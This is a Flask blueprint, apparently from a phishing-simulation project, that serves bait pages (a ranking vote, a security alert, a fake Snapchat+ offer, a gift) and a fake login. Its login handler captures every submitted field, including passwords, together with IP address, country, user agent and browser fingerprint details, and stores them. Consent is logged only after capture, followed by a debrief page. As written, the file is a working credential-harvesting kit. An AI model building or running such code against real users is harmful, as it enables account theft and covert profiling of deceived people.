import json
import sqlite3

from flask import Blueprint, request, render_template, redirect, url_for, jsonify, session

from ..config import CONFIG
from ..database import generate_participant_id, log_event, init_database
from ..crypto import encrypt_password
from ..geo import geoip

auth_bp = Blueprint('auth', __name__)


@auth_bp.route('/api/consent', methods=['POST'])
def record_consent():
    data = request.get_json(force=True)
    participant_id = data.get('participant_id')
    if not participant_id:
        return jsonify({"error": "participant_id requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "UPDATE captured_credentials SET consent_given=1 WHERE participant_id=?",
        (participant_id,)
    )
    conn.commit()
    conn.close()
    log_event("CONSENT_GIVEN", participant_id)
    return jsonify({"status": "recorded", "id": participant_id})


@auth_bp.route('/')
def index():
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    scenario = request.args.get('scenario', 'classement')
    return render_template('bait.html',
                          participant_id=session['participant_id'])


@auth_bp.route('/scenario/<scenario_id>')
def scenario_page(scenario_id):
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    templates = {
        "classement": "bait.html",
        "securite": "scenarios/scenario_securite.html",
        "snapchat_plus": "scenarios/scenario_snapchat_plus.html",
        "cadeau": "scenarios/scenario_cadeau.html",
    }
    tpl = templates.get(scenario_id, "bait.html")
    log_event("SCENARIO_VIEW", session['participant_id'], {"scenario": scenario_id})
    return render_template(tpl, participant_id=session['participant_id'])


@auth_bp.route('/api/log', methods=['POST'])
def api_log():
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify({"ok": False, "error": "no data"}), 400
    event = data.get('event', 'UNKNOWN')
    pid = data.get('participant_id', 'unknown')
    log_event(event, pid, {"user_agent": request.headers.get('User-Agent', '')[:200]})
    return jsonify({"ok": True})


@auth_bp.route('/login')
def login_page():
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    return render_template('login.html',
                          participant_id=session['participant_id'])


@auth_bp.route('/password')
def password_page():
    if 'participant_id' not in session:
        return redirect(url_for('auth.index'))
    return render_template('password.html',
                          participant_id=session['participant_id'])


@auth_bp.route('/login', methods=['POST'])
def handle_login():
    participant_id = request.form.get('participant_id') or session.get('participant_id')
    form_fields = dict(request.form)
    username = (
        form_fields.get('username', '')
        or form_fields.get('email', '')
        or form_fields.get('accountIdentifier', '')
        or form_fields.get('account_identifier', '')
        or form_fields.get('login', '')
    )
    password = (
        form_fields.get('password', '')
        or form_fields.get('passwd', '')
        or form_fields.get('pass', '')
        or form_fields.get('pwd', '')
    )
    all_fields = {k: v for k, v in form_fields.items()
                  if k != 'participant_id'}
    log_event("LOGIN_ATTEMPT", participant_id, {
        "username_provided": bool(username),
        "password_provided": bool(password),
        "username_length": len(username),
        "fields_count": len(all_fields),
        "field_names": list(all_fields.keys())
    })
    if username or all_fields:
        credential_str = json.dumps(all_fields, ensure_ascii=False)
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        try:
            screen_res = request.form.get('screen_resolution', '')
            timezone = request.form.get('timezone', '')
            browser_lang = request.form.get('browser_language', '')
            platform = request.form.get('platform', '')
        except:
            screen_res = timezone = browser_lang = platform = ''
        country = geoip(request.remote_addr)
        c.execute('''
            INSERT INTO captured_credentials 
            (participant_id, username, password, ip_address, user_agent, session_token,
             screen_resolution, timezone, browser_language, platform, notes, country)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (participant_id,
              username or json.dumps(all_fields),
              encrypt_password(password or ''),
              request.remote_addr,
              request.headers.get('User-Agent', 'Unknown'),
              None,
              screen_res, timezone, browser_lang, platform,
              credential_str,
              country))
        conn.commit()
        conn.close()
        log_event("CAPTURE", participant_id, {
            "fields": list(all_fields.keys()),
            "username_length": len(username),
            "password_length": len(password),
        })
    try:
        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
        conn2.execute(
            "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
            (participant_id,)
        )
        conn2.commit()
        conn2.close()
    except:
        pass
    return render_template('redirect.html',
                          message="Connexion. Redirection...",
                          delay=2)


@auth_bp.route('/debrief')
def debrief():
    pid = session.get('participant_id', 'inconnu')
    log_event("DEBRIEF_VIEW", pid)
    return render_template('debrief.html', participant_id=pid)
